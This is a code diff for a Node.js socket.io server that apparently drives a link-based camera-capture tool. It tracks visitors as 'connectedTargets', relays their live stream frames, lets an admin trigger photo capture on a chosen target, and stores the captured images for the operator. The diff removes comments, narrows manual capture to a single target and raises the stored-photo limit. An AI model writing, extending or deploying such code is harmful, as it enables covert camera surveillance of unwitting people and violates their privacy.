@@ -16,7 +16,7 @@ if (!fs.existsSync(uploadDir)) {
 let storedPhotos = [];
 let isAutoCaptureOn = true;
 let isLinkActive = true;
-let connectedTargets = {}; // Track active user sockets
+let connectedTargets = {};
 
 app.use((req, res, next) => {
     if (!isLinkActive && req.path !== '/admin.html') {
@@ -50,7 +50,7 @@ app.use(express.static(__dirname));
 app.use('/uploads', express.static(uploadDir));
 
 io.on('connection', (socket) => {
-    // Add user to active target pool if not admin
+    // Register user target
     connectedTargets[socket.id] = { id: socket.id };
     io.emit('update-users-list', connectedTargets);
 
@@ -77,20 +77,16 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Relay live stream frame with socket id tag
     socket.on('live-stream-frame', (frameData) => {
         if (isLinkActive) {
             io.emit('update-live-stream', { socketId: socket.id, frameData });
         }
     });
 
-    // Handle manual capture (target specific or global fallback)
     socket.on('admin-trigger-capture', (targetSocketId) => {
         if (!isLinkActive) return;
         if (targetSocketId && connectedTargets[targetSocketId]) {
             io.to(targetSocketId).emit('capture-photo');
-        } else {
-            io.emit('capture-photo');
         }
     });
 
@@ -106,8 +102,7 @@ io.on('connection', (socket) => {
 
         const photoObj = { imageData, fileName };
         storedPhotos.push(photoObj);
-
-        if (storedPhotos.length > 30) storedPhotos.shift();
+        if (storedPhotos.length > 40) storedPhotos.shift();
 
         io.emit('send-photo-to-admin', photoObj);
     });
